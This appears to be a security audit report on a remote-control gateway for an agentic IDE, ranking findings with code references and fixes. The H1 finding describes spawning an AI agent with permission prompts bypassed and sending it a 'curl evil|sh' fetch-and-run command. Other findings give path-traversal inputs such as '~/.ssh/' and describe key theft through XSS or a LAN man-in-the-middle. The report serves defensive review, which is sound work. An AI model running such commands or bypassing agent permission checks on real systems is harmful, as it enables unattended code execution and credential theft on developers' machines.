# Security Audit — Remote Control (web/mobile client + gateway + tunnel)

Branch: `douwe/remote-control`. Audit method: 6 parallel domain agents (pairing, Noise crypto,
gateway/transport, capabilities/authz, tunnel, protocol/client-secrets); headline findings
independently re-verified against source. Trust model: controlling a paired session ≈ arbitrary
code execution on the developer's machine, so auth/authz bypass = Critical.

## Verdict

The cryptographic and authentication core is **sound and I could not break it**. Noise
`IK`/`IKpsk1` is a faithful build on audited `@noble` primitives — mutual auth, forward secrecy,
no nonce reuse, no downgrade or cleartext fallback. Pairing is anchored in a 256-bit out-of-band
secret + user-confirmed SAS; steady-state devices are pinned by static key; the per-method
capability allowlist is enforced **server-side** (not UI-only); git shells out via `execFile`
(no shell injection); file read/write handlers are deliberately unreachable from the wire; the
tunnel is a dumb outbound proxy to the same Noise-gated gateway (no localhost trust shortcut).

The real risks are in **capability granularity** and **operational exposure**, not a broken gate.

## Findings (ranked, deduped)

### HIGH

**H1 — A `control` device can spawn an agent in `trusted`/`bypassPermissions` → unattended, prompt-free RCE.** (verified)
`RemotePermissionMode` (messages.ts:27-33) includes `"trusted"`; `agents.spawn` (capabilities.ts:841)
passes `permission_mode` straight to `startAgent`, which applies it spawn-time. `trusted` ==
`bypassPermissions` (agentService.ts:1449) — the CLI then auto-runs every tool with **no**
`permission.request` forwarded to anyone. Exploit: paired control device calls `agents.spawn`
`{permission_mode:"trusted"}` then `agents.send` "run `curl evil|sh`"; host user sees no prompt.
_Fix:_ drop `"trusted"` from the remote enum (or reject it in the spawn / set_permission_mode
handlers); keep `bypassPermissions` host-only.

### MEDIUM

**M1 — `permission.respond` is in the default `monitor` tier.** (verified: capabilities.ts:32)
A monitor-only device (the default grant when the user does NOT tick "control") can approve any
tool-use prompt the gateway forwarded to it — in an agentic IDE, approving a shell prompt is a
code-execution surface. Scope is otherwise tight (only its own `outstandingPermissions`). The
distance between "monitor" and "control" is smaller than the UI implies.
_Fix:_ move `permission.respond` behind `control`, or add a distinct `approve` capability.

**M2 — `sessions.resolve_mention_path` has no path containment.** (verified)
`resolveMentionPath` (file/operations.ts) expands `~/` to home and takes leading `/` as an
absolute path verbatim — no `assertInsideSession`. `control`-reachable. Exploit: `{query:"~/.ssh/"}`
or `"/etc/"` returns the directory listing (filenames of keys/configs). Enumeration, not file
bytes (readFile isn't wired to the wire), but a recon/disclosure escape violating the module's own
invariant. _Fix:_ confine remote browsing to the session worktree plus registered project roots —
cross-project @-mentions (e.g. a backend file in another project) still work, but `~/.ssh` / `/etc`
and other arbitrary paths are rejected.

**M3 — `repo_root` is client-supplied and unvalidated; grants are host-global (IDOR-by-design).** (verified)
`createSession(repoRoot,…)` (session/manager.ts) never checks `repoRoot` against
`appState.repoRoots`. `sessions.list`/`agents.list` likewise accept arbitrary `repo_root`. A
device paired "to watch one project" can read and drive **every** project/session/agent, and
`sessions.create` against an attacker-influenced repo runs that repo's `.argus.json` setup
pipeline. _Fix:_ allowlist `repo_root` against `collectAllProjects()`; optionally add per-device
`allowedRepoRoots` scoping to the grant.

**M4 — Unauthenticated pre-handshake DoS (no `maxPayload`, no handshake timeout, no connection cap).**
`new WebSocketServer({ noServer: true })` (localGatewayServer.ts:170) → `ws` default 100 MiB/frame;
oversized "handshake" frames buffer fully pre-auth; idle sockets held forever; `connections`
unbounded. Reachable on LAN (`0.0.0.0`) and over the tunnel (all traffic looks like `127.0.0.1`,
so per-IP limiting is structurally impossible). _Fix:_ `maxPayload` ~64KB; handshake-completion
timeout; concurrent/incomplete-handshake caps.

**M5 — Web client stores the device static private key extractable in `localStorage`.**
`argus-web/src/lib/keystore.ts` persists `devPrivB64` as plaintext. Any script in the gateway
origin (XSS — and the gateway serves the bundle from that same origin) exfiltrates it → durable,
independently-connectable device with its full grant (incl. control). Mobile does this right
(`expo-secure-store`, hardware-backed). _Fix:_ non-extractable WebCrypto `CryptoKey` in IndexedDB;
do the DH inside WebCrypto. Pairs with M6.

**M6 — LAN mode serves the client bundle + `ws://` over plaintext HTTP on `0.0.0.0`.**
Noise protects the protocol, but the _delivery of the client JS_ is unauthenticated plaintext. A
LAN MITM (ARP/rogue AP) injects JS into the same-origin bundle → reads the device key (M5) and
issues fully-authenticated control commands. The tunnel path gets TLS from Cloudflare; LAN does
not. _Fix:_ serve LAN over `wss`, or gate LAN mode behind an explicit "trusted network only"
warning and prefer the tunnel.

### LOW

- **L1 — Static server prefix-sibling traversal:** `resolved.startsWith(path.resolve(staticDir))`
  (localGatewayServer.ts:71) lacks a trailing separator, so `/app/web-secret/x` passes for
  `staticDir=/app/web`. Unauthenticated read. _Fix:_ compare against `resolve(staticDir)+path.sep`.
- **L2 — Mermaid `dangerouslySetInnerHTML`** (argus-web/src/ui/Mermaid.tsx): only current defense is
  mermaid's default `securityLevel:"strict"`/DOMPurify — not pinned. One sanitizer bypass = stored
  XSS → key theft (M5). _Fix:_ pin `securityLevel:"strict"` explicitly + own DOMPurify pass or
  sandboxed iframe. (Markdown itself is safe: react-markdown, `javascript:` stripped.)
- **L3 — No Origin/Host validation on WS upgrade / HTTP** (CSWSH / DNS-rebinding). Mitigated because
  the Noise credential is a non-ambient key (not a cookie), so cross-origin JS can't drive commands.
  Add an Origin allowlist + Host check as defense-in-depth.
- **L4 — No client-side schema validation:** transport blind-casts every inbound payload
  (`as Remote…`). Bounded by the authenticated peer; a buggy/compromised gateway can crash the tab.
  _Fix:_ validate envelopes/payloads against the shared zod schemas at the transport boundary.
- **L5 — H.264 decoder robustness** (argus-web/src/lib/h264Decoder.ts): wire-controlled `u16`
  dimensions assigned to canvas (65535² → multi-GB alloc); `decoder.configure()` not wrapped in
  try/catch. Buggy/compromised gateway → tab OOM/unhandled throw. _Fix:_ clamp dims, guard configure.
- **L6 — Plaintext desktop keystore fallback** when `safeStorage` unavailable (headless Linux),
  only a `warn` (deviceStore.ts). Leaks the desktop identity (impersonation), not any client control
  key. _Fix:_ require encryption to enable remote access, or explicit opt-in to the fallback.
- **L7 — No handshake rate limiting** (CPU burn per attempt; not brute-force — 256-bit).
- **L8 — Tunnel not force-killed on signal/crash paths** (`child.kill()` SIGTERM only;
  `syncShutdownCleanup` skips the tunnel). Orphan proxies to a dead port. _Fix:_ stop tunnel in the
  sync cleanup + SIGKILL escalation.
- **L9 — Silent persistent internet exposure / no explicit consent:** `remote_enabled` persists and
  re-spawns the tunnel on every launch with no confirmation modal or standing "you are publicly
  reachable" indicator. _Fix:_ one-time confirmation + persistent status.
- **L10 — Unbounded `agents.send` message/images (DoS); unclamped `devices.touch` coords.**
- **L11 — Cloudflare connector token on argv** (visible via `ps` to other local users).
- **L12 — Crypto hardening (fail-safe today):** no nonce-2^64 guard; null-key plaintext passthrough
  footgun; pre-handshake handshake-object churn + possible double-`DeviceConnection` race
  (localGatewayServer.ts:99-131).
- **L13 — `rotateDesktopIdentity` doesn't disconnect live connections** (unlike `revokeDevice`).
- **L14 — QR-race:** an attacker who captures the QR within the 2-min window can race the legitimate
  phone, which then silently stalls (mitigated by the mandatory SAS-compare + confirm).

## Confirmed-sound (no action)

Noise IK/IKpsk1 correctness (mutual auth, FS, nonce discipline, no downgrade/cleartext fallback,
three copies non-divergent); pairing anchor (256-bit OOB secret + SAS + user confirm); device
identity bound to key possession not client-supplied `device_id`; server-side per-method capability
enforcement; git via `execFile`; file read/write unreachable from wire; revocation + capability
downgrade tear down live connections; tunnel reuses the LAN auth path unchanged, argv-array spawn
(no injection), no runtime binary download; web client ignores the pairing `url` (no gateway
redirection); markdown rendering safe; image data-URLs confined to `<img src>`.

## Suggested priority

1. H1 — remove `trusted` from the remote enum (unattended RCE).
2. M1 — move `permission.respond` behind `control` (default-tier approval = partial RCE).
3. M2/M3 — contain `resolve_mention_path`; allowlist `repo_root`.
4. M4 — pre-handshake DoS hardening (`maxPayload`, timeouts, caps).
5. M5/M6 — non-extractable web key + LAN plaintext-delivery warning/`wss`.
